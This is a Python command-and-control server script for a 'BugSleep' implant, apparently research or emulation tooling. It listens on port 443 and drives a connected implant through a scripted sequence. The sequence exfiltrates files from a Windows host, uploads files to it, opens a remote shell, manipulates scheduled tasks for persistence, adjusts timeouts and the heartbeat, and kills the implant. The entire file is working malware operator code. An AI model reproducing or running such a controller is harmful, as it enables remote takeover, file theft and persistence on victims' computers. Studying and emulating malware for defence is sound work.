#!/usr/bin/env python3

import argparse
import socket

import logging

from utils import *
from commands import *

LOG_FMT = "[%(asctime)s][%(name)s][%(levelname)-8s] %(message)s"

logger = logging.getLogger("BugSleep")


def get_args():
    parser = argparse.ArgumentParser(description="C2 server for BugSleep implant")
    parser.add_argument(
        "-a", "--address", default="0.0.0.0", help="Address to listen on"
    )

    parser.add_argument("-p", "--port", type=int, default=443, help="Port to listen on")
    parser.add_argument(
        "-d",
        "--directory",
        default="./target_files/",
        help="Directory to place files from target.",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="Set verbosity level (-v, -vv)",
    )
    args = parser.parse_args()
    args = parser.parse_args()
    levels = [logging.INFO, logging.DEBUG]
    level = levels[min(args.verbose, len(levels) - 1)]  # cap to last level index

    logging.basicConfig(level=level, format=LOG_FMT)

    return args


def wrap_cmd(sock, meth, *args):
    conn, addr = sock.accept()
    logger.info("Connected by %s:%d", addr[0], addr[1])

    # Process beacon
    get_beacon(conn)

    # Send ping command
    meth(conn, *args)

    conn.shutdown(socket.SHUT_RDWR)
    conn.close()


def main():
    args = get_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((args.address, args.port))
    logger.info("Listening on %s:%d...", args.address, args.port)
    sock.listen()

    wrap_cmd(sock, cmd_ping)
    wrap_cmd(sock, cmd_ping)
    wrap_cmd(sock, cmd_get, args.directory, "C:\\Users\\User\\Documents\\Hello.txt")
    wrap_cmd(sock, cmd_get, args.directory, "C:\\Windows\\System32\\notepad.exe")
    wrap_cmd(
        sock,
        cmd_put,
        "/home/user/TestFile.txt",
        "C:\\Users\\User\\Documents\\TestFile.txt",
    )
    wrap_cmd(
        sock,
        cmd_put,
        "/home/user/deep-thoughts.txt",
        "C:\\Users\\User\\Documents\\deep-thoughts.txt",
    )
    wrap_cmd(sock, cmd_shell)
    wrap_cmd(sock, cmd_task_check)
    wrap_cmd(sock, cmd_task_delete)
    wrap_cmd(sock, cmd_task_check)
    wrap_cmd(sock, cmd_task_add)
    wrap_cmd(sock, cmd_inc_timeout, 5)
    wrap_cmd(sock, cmd_sock_timeout, 120)
    wrap_cmd(sock, cmd_update_heartbeat, 5)
    wrap_cmd(sock, cmd_kill)


if __name__ == "__main__":
    main()
